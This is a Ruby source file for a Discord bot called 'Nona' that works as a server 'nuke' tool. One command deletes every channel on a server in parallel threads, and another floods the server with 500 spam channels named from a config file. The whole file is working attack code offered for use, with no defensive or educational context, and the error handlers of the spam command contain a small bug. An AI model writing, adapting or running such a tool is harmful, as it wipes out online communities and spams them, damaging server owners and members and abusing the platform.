require "discordrb"
require "yaml"
require "colorize"
require "json"

data = YAML.load(File.read("config.yaml"))

Token  = data["Nona"]["config"]["Token"]
Prefix = data["Nona"]["config"]["Prefix"]

Nona = Discordrb::Commands::CommandBot.new token: Token , prefix: Prefix

def returnTime()
    time = Time.new
    return time.strftime("%H:%M:%S")
end

#######################
#                     #
# Delete All Channels #
#                     #
#######################

Nona.command :delete_all_channels do |event|
    if event.server
        threadCount = []
        totalThreads = 0
        totalChannels = 0

        channelsToDelete = event.server.channels
        channelsToDelete.each do |channel|
            totalChannels += 1
            threadCount << Thread.new(channel) do |chan|
                totalThreads += 1
                begin
                    chan.delete
                rescue Discordrb::Errors::NoPermission
                    puts "No permission to delete channel #{chan.name}."
                rescue => error
                    puts "[ #{returnTime} ] An error occurred while deleting channel #{chan.name}: #{error.message}."
                end
            end
        end
        threadCount.each(&:join)
        puts "[ #{returnTime} ] Successfully connected to #{totalThreads} threads to delete #{totalChannels} channels!".green
    end
end

########################
#                      #
# Create Spam Channels #
#                      #
########################

Nona.command :create_random_channels do |event|
    if event.server

        data = JSON.parse((File.read("config.json")))
        channelNames = data["Channels"]
        threadCount  = []
        totalThreads  = 0
        totalChannels = 0

        500.times do
            channelName = channelNames.sample
            threadCount << Thread.new(channelName) do |name|
                totalThreads += 1
                begin
                    event.server.create_channel(name)
                    totalChannels += 1
                rescue Discordrb::Errors::NoPermission
                    puts "No permission to create channel #{chan.name}."
                rescue => error
                    puts "[ #{returnTime} ] An error occurred while creating channel #{chan.name}: #{error.message}."
                end
            end
        end
        threadCount.each(&:join)
        puts "[ #{returnTime} ] Successfully connected to #{totalThreads} threads to create #{totalChannels} channels!".green
    end
end

Nona.run